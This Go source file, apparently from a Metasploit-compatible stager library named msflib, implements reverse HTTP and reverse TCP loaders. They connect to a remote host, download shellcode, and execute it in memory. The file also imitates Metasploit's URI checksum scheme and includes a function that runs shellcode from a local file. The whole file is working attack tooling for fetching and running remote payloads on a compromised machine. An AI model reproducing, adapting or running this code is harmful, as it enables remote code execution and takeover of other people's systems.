package msflib

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/vyrus001/base64url"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"strings"
	"syscall"
	"time"
)

var (
	CHECKSUMMODE int
	PLATFORM     int
)

// RE'd from the way msf makes URIs
func getURL() string {

	// init
	puid := "DC949HAX"
	timestamp := time.Now().UTC().Unix()
	platformXor := rand.Intn(255)
	archXor := rand.Intn(255)
	var arch int
	if strings.HasPrefix(runtime.GOARCH, "amd64") {
		arch = 2
	}

	// generate uuid
	var timeXor int32
	binary.Read(bytes.NewBuffer([]byte{
		byte(platformXor),
		byte(archXor),
		byte(platformXor),
		byte(archXor)}),
		binary.BigEndian, &timeXor)
	var uuid int64
	binary.Read(bytes.NewBuffer([]byte{
		byte(platformXor),
		byte(archXor),
		byte(platformXor ^ PLATFORM),
		byte(archXor ^ arch),
		byte(int64(timeXor) ^ timestamp)}),
		binary.BigEndian, &uuid)
	uri := base64url.Encode([]byte(puid + fmt.Sprintf("%x", uuid)))

	// bruteforce checksum
	for {
		// uuid + padding = uri
		uri = uri + base64url.Rand(1)

		// calculate uri checksum
		var sum int
		for _, ch := range uri {
			sum = sum + int(ch)
		}
		checksum := sum % 0x100

		// if at first your checksum is bad...
		if checksum == CHECKSUMMODE {
			return string(uri)
		}
	}
}

// call payload
func caller(address uintptr) {
	syscall.Syscall(address, 0, 0, 0, 0)
}

/*	###
	External Funcs
	###
*/

func ReverseHTTP(hostAndPort string) error {
	// *** assumes hostAndPort is in format of <http://Domain>[:<Port>]
	response, err := http.Get(hostAndPort + "/" + getURL())
	if err != nil {
		return err
	}
	defer response.Body.Close()
	payload, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}
	callPayload(payload)
	return nil
}

func ReverseTCP(hostAndPort string) error {
	// *** assumes hostAndPort is in format of <IP/Domain>:<Port>
	socket, err := net.Dial("tcp", strings.TrimPrefix(hostAndPort, "tcp://"))
	if err != nil {
		panic(err)
		return err
	}

	// read payload size
	var payloadSizeRaw = make([]byte, 4)
	numOfBytes, err := socket.Read(payloadSizeRaw)
	if err != nil {
		return err
	}
	if numOfBytes != 4 {
		return errors.New("Number of size bytes was not 4!")
	}
	payloadSize := int(binary.LittleEndian.Uint32(payloadSizeRaw))

	// read payload
	var payload = make([]byte, payloadSize)
	numOfBytes, err = socket.Read(payload)
	if err != nil {
		return err
	}
	if numOfBytes != payloadSize {
		return errors.New("Number of payload bytes does not match payload size!")
	}

	// fix socket
	socketFD := getFDBytes(socket.(*net.TCPConn))
	payload = append(append([]byte{0xBF}, socketFD...), payload...)

	callPayload(payload)
	return nil
}

// mostly for testing, but should work on any shellcode
func LoadLocal(file string) {
	data, _ := ioutil.ReadFile(file)
	callPayload(data)
}
